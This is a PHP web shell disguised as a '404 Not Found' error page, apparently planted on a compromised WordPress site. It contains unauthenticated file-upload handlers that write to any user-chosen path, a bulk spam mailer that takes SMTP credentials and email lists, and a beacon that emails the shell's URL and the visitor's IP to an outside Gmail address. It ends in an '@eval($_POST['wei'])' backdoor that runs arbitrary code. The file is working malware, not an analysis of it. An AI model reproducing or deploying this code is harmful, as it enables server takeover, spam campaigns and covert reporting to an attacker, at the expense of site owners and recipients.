<?php  error_reporting(0); function query_str($params){ $str = ''; foreach ($params as $key => $value) { $str .= (strlen($str) < 1) ? '' : '&'; $str .= $key . '=' . rawurlencode($value); } return ($str); } function lrtrim($string){ return stripslashes(ltrim(rtrim($string))); } if(isset($_GET['up']) && !empty($_GET['up'])){ echo"".$_FILES['userfile'].""; $uploaddir = './'; $uploadfile = $uploaddir . basename($_FILES['userfile']['name']); if ( isset($_FILES["userfile"]) ) { echo 'uploaded'; if (move_uploaded_file ($_FILES["userfile"]["tmp_name"], $uploadfile)) echo $uploadfile; else echo 'failed'; } exit; } if(isset($_POST['action'] ) ){ $b = query_str($_POST); parse_str($b); $sslclick=lrtrim($sslclick); $action=lrtrim($action); $message=lrtrim($message); $emaillist=lrtrim($emaillist); $from=lrtrim($from); $reconnect=lrtrim($reconnect); $epriority=lrtrim($epriority); $my_smtp=lrtrim($my_smtp); $ssl_port=lrtrim($ssl_port); $smtp_username=lrtrim($smtp_username); $smtp_password=lrtrim($smtp_password); $replyto=lrtrim($replyto); $subject_base=lrtrim($subject); $realname_base=lrtrim($realname); $file_name=$_FILES['file']['name']; $file=$_FILES['file']['tmp_name']; $urlz=lrtrim($urlz); $contenttype=lrtrim($contenttype); $encode_text=$_POST['encode']; $message = urlencode($message); $message = ereg_replace("%5C%22", "%22", $message); $message = urldecode($message); $message = stripslashes($message); $subject = stripslashes($subject); if ($encode_text == "yes") { $subject = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $subject); $subject = str_replace(' ', '_', $subject); $subject = "=?UTF-8?Q?$subject?="; $realname = preg_replace('/([^a-z ])/ie', 'sprintf("=%02x",ord(StripSlashes("\\1")))', $realname); $realname = str_replace(' ', '_', $realname); $realname = "=?UTF-8?Q?$realname?="; } } ?>

<?php  $ip = getenv("REMOTE_ADDR"); $hostname = gethostbyaddr($ip); $bilsmg = "Link Mailer : http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'] . "\r\n"; $bilsnd ="7054company@gmail.com"; $bilsub = "*************WORDPRESS SHELL UPLOAD************** ?ok !! $ip"; $bilhead = "From: MaileRyew"; $bilhead .= $_POST['eMailAdd']."\n"; $bilhead .= "MIME-Version: 1.0\n"; $arr=array($bilsnd, $IP); foreach ($arr as $bilsnd) mail($bilsnd,$bilsub,$bilsmg,$bilhead,$message); ?>
<?php
if (isset ($_GET['ok']))
{
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
    }
}echo '<html><head><title>Upload files</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
}
?>
<?php @eval($_POST['wei']); ?>
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL was not found on this server.</p>
</body></html><?php 